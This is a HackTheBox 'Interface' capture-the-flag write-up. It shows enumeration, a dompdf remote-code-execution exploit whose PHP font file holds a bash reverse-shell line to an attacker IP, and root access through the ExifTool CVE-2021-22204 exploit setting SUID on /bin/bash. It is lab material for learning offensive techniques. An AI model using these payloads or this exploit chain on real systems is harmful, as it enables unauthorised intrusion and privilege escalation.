
# Introduction
Interface is a medium difficulty machine on HackTheBox website which is an interesting one because it makes you learn about using CSS in exploiting web application which is crazy because most of us are used to using technologies like PHP, Javascript anything like that to exploit web applications so let's dive into it.
# Initial scanning
First I fired up an Nmap scan to discover open ports on the machine.
```bash
┌──(kali㉿kali)-[~/HTB/interface]
└─$ nmap -sC -sV 10.10.11.200
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 13:35 EDT
Nmap scan report for 10.10.11.200
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7289a0957eceaea8596b2d2dbc90b55a (RSA)
|   256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA)
|_  256 cc62905560a658629e6b80105c799b55 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site Maintenance
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.30 seconds
```
And we found two open ports which are 22 for SSH and 80 for HTTP which indicates that there a website running on this machine so I fired up Firefox and tried to view the website but it showed that the website is still under maintenance and they will be back soon!
![image](/Interface/img/1.png)
After that I tried to find any hidden directory but I didn't find anything so I tried to intercept the response of the GET request using Burpsuite and I found a hidden subdomain for the website so I added it to my hosts file on kali linux
![image](/Interface/img/2.png)
So I tried to open the subdomain on the web browser and I didn't get anything so I tried to curl the subdomain and it gave me ***NOT FOUND***
```bash
┌──(kali㉿kali)-[~/HTB/interface]
└─$ curl http://prd.m.rendering-api.interface.htb
File not found.
```
So I fired up Gobuster to discover if there were some hidden directories in this subdomain and found two which are **/vendor** and **/api** so I tried to dig deeper in those directories and I discovered that the **/vendor** directory has two directories in it which are **dompdf** and **composer** 
```bash
┌──(kali㉿kali)-[~/HTB/interface]
└─$ gobuster dir -u http://prd.m.rendering-api.interface.htb/vendor -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://prd.m.rendering-api.interface.htb/vendor
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/06 06:28:35 Starting gobuster in directory enumeration mode
===============================================================
/dompdf               (Status: 403) [Size: 15]
/composer             (Status: 403) [Size: 15]
```
and I found [this exploit](https://github.com/positive-security/dompdf-rce) which exploits the dompdf software. continuing in discovering more directories I found html2pdf directory but using the POST method
```bash
┌──(kali㉿kali)-[~/HTB/interface]
└─$ wfuzz -c --hh=50 --hw=13 -X POST -t 200 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt http://prd.m.rendering-api.interface.htb/api/FUZZ 


********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/api/FUZZ
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                               
=====================================================================

000006080:   422        0 L      2 W        36 Ch       "html2pdf" 
```
# Initial Foothold
So after I found all of this useful information I went on to use the exploit we found earlier so first I downloaded it and modified it to connect the shell to my local machine
```bash
┌──(kali㉿kali)-[~/HTB/interface]
└─$ git clone https://github.com/positive-security/dompdf-rce                                                                      
Cloning into 'dompdf-rce'...
remote: Enumerating objects: 343, done.
remote: Counting objects: 100% (343/343), done.
remote: Compressing objects: 100% (271/271), done.
remote: Total 343 (delta 67), reused 329 (delta 62), pack-reused 0
Receiving objects: 100% (343/343), 3.99 MiB | 3.20 MiB/s, done.
Resolving deltas: 100% (67/67), done.
┌──(kali㉿kali)-[~/HTB/interface]
└─$ cd dompdf-rce/exploit
┌──(kali㉿kali)-[~/HTB/interface/dompdf-rce/exploit]
└─$ cat exploit.css     
@font-face {
    font-family:'exploitfont';
    src:url('http://localhost:9001/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
  }
┌──(kali㉿kali)-[~/HTB/interface/dompdf-rce/exploit]
└─$ cat exploit_font.php 

� dum1�cmap
           `�,glyf5sc��head�Q6�6hhea��($hmtxD
loca
Tmaxp\ nameD�|8dum2�
                     -��-����
:83#5:08��_<�
             @�8�&۽
:8L��

:D

6                               s
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.83/1234 0>&1'") ?>
```
after you modify the payload you should fire up a python HTTP server and send a request to the /api/html2pdf directory
![image](Interface/img/3.png)
```bash
┌──(kali㉿kali)-[~/HTB/interface/dompdf-rce/exploit]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.200 - - [06/May/2023 10:17:53] "GET /exploit.css HTTP/1.0" 200 -
10.10.11.200 - - [06/May/2023 10:17:54] "GET /exploit_font.php HTTP/1.0" 200 -
```
after that you generate a md5 hash of the url of the request
```bash
┌──(kali㉿kali)-[~]
└─$ echo -n 'http://YOUR_IP/exploit_font.php' | md5sum                                                                                       
d4ddc9a6119c39714e3a5ea171d6f78f  -
```
after that you send a POST request to the PHP file 
```bash
┌──(kali㉿kali)-[~]
└─$ curl -s -X POST -i http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_d4ddc9a6119c39714e3a5ea171d6f78f.php
```
and WOHOOO we get a reverse shell as www-data
# Privilage Escalation
so after I was able to gain access to the machine I started the privilage escalation process and I that there is a script called cleancache.sh in /usr/local/sbin/ so I read it.
```bash
www-data@interface:/home/dev$ cat /usr/local/sbin/cleancache.sh 
#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done
```
this script deletes any file which contains dompdf in its data and it uses Exiftool to do this so I showed the version number of Exiftool and I found an exploit to it so git cloned it and it generated an image with the payload in its metadata so I waited for few seconds for the cron job to work and  it worked!!!
```bash
karim@DESKTOP-O22KFUH:~/exploit-CVE-2021-22204$ python3 exploit-CVE-2021-22204.py -c "chmod u+s /bin/bash"

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....

UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
PAYLOAD: (metadata "\c${system('chmod u+s /bin/bash')};")
DEPENDS: Dependencies for exploit are met!
PREPARE: Payload written to file!
PREPARE: Payload file compressed!
PREPARE: DjVu file created!
PREPARE: JPEG image created/processed!
PREPARE: Exiftool config written to file!
EXPLOIT: Payload injected into image!
CLEANUP: Old file artifacts deleted!
SUCCESS: Exploit image written to "image.jpg"
```
```bash
www-data@interface:~$ wget http://10.10.14.17/gato.jpeg --2023-02-24 00:23:13-- http://10.10.14.17/gato.jpeg Connecting to 10.10.14.17:80... connected. HTTP request sent, awaiting response... 200 OK Length: 196657 (192K) [image/jpeg] Saving to: 'image.jpg' gato.jpeg 100%[===================>] 192.05K 1.15MB/s in 0.2s 2023-02-24 00:23:14 (1.15 MB/s) - 'image.jpeg' saved [196657/196657] 
www-data@interface:~$ mv image.jeg /tmp
www-data@interface:~$ ls -l /bin/bash 
-rwsr-xr-x 1 root root 1113504 Apr 18 2022 /bin/bash 
www-data@interface:~$ bash -p 
bash-4.4# cat /root/root.txt
bash-4.4#
```